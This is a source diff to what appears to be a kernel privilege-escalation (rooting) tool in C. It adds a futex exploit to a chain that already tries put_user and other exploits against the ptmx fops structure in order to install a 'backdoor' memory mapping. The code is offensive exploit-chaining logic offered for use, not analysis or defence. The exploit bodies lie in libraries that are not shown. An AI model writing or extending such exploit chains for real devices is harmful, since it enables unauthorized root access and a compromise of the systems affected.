@@ -15,6 +15,7 @@
 #include "libdiagexploit/diag.h"
 #include "libfj_hdcp_exploit/fj_hdcp.h"
 #include "libput_user_exploit/put_user.h"
+#include "libfutex_exploit/futex.h"
 #include "libfb_mem_exploit/fb_mem.h"
 #include "backdoor_mmap.h"
 #include "build_remap_pfn_range.h"
@@ -397,6 +398,12 @@ run_exploit(void)
   printf("Attempt put_user exploit...\n");
   if (put_user_run_exploit(ptmx_fsync_address, (int)&install_mmap,
                        run_install_mmap, (void *)ptmx_fops_address)) {
+    return true;
+  }
+
+  printf("Attempt futex exploit...\n");
+  if (futex_run_exploit(ptmx_fsync_address, (int)&install_mmap,
+                        run_install_mmap, (void *)ptmx_fops_address)) {
     return true;
   }
 
